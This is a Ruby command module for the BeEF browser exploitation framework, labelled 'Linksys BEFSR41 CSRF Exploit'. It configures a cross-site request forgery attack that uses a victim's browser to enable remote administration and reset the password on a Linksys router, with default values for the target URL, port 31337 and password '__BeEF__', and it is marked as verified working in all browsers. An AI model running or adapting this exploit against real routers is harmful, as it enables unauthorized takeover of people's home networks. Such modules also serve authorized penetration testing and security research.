module BeEF
module Modules
module Commands


class Befsr41_csrf < BeEF::Command
  
  #
  # Defines and set up the command module.
  #
  def initialize
    super({
      'Name' => 'Linksys BEFSR41 CSRF Exploit',
      'Description' => 'Attempts to enable remote administration and change the password on a Linksys BEFSR41 router.',
      'Category' => 'Network',
      'Author' => 'Martin Barbella',
      'Data' => [
        {'name' => 'base', 'ui_label' => 'Router web root', 'value' => 'http://arbitrary:admin@192.168.1.1/'}, 
        {'name' => 'port', 'ui_label' => 'Desired port', 'value' => '31337'}, 
        {'name' => 'password', 'ui_label' => 'Desired password', 'value' => '__BeEF__'}  
      ],
      'File' => __FILE__
    })

    set_target({
      'verified_status' =>  VERIFIED_WORKING, 
      'browser_name' =>     ALL
    })
    
    use_template!
  end
  
  def callback
    save({'result' => @datastore['result']})
  end
  
end

end
end
end